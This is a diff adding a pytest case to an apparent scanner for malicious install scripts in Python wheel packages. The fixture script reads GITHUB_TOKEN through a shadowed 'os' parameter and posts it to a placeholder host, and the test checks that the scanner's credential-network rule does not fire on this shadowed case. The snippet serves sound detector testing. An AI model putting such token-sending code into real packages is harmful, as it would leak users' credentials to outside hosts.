@@ -132,6 +132,21 @@ def test_wheel_install_script_shadowed_class_client_is_not_credential_network(
     assert not any(item.rule == "wheel_install_script_credential_network" for item in findings)
 
 
+def test_wheel_install_script_shadowed_os_credential_is_not_denied(make_wheel) -> None:
+    artifact = make_wheel(
+        {
+            "demo-1.0.0.data/scripts/send": (
+                "import os, requests\n"
+                "def send(os):\n"
+                "    token = os.getenv('GITHUB_TOKEN')\n"
+                "    requests.post('https://example.test', data=token)\n"
+            )
+        }
+    )
+    findings = scan_install_surface(str(artifact))
+    assert not any(item.rule == "wheel_install_script_credential_network" for item in findings)
+
+
 def test_wheel_install_script_file_credential_network_is_denied(make_wheel) -> None:
     artifact = make_wheel(
         {
